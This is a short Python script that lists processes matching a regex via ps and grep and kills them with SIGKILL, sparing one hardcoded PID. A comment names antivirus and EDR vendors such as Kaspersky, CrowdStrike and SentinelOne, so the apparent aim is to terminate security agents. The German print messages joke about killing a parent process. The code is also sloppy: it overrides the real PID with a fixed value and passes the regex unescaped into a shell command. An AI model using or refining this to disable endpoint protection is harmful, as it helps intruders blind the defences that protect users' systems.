#!/usr/bin/python3
import os
import signal
from time import sleep

def get_pids(regex):
    output = []
    # kaspersky, norton, corwdstrike, deepinstinct, sentinelone, checkpoint, cybereason
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{ print $2 }}'" 
    output = os.popen(cmd).read()
    pids = output.strip().split('\n')
    print(pids)
    return pids








def check_parent():
    my_pid = os.getpid()
    my_pid = '97252'
    pids = get_pids('*mclient$')
    if len(pids) != 1:
        for pid in pids:
            if pid != my_pid:
                print("-kill " +pid)
                sleep(10)
                os.kill(int(pid), signal.SIGKILL)  
                #os.popen(f'kill -9 {pid}').read()
        return True   
    else:
        return False


def main():
    if check_parent():
        print("Papa ist da! Papa t√∂ten ich habe.^^")
    else:
        print("Ich kein Vater haben :(")

main()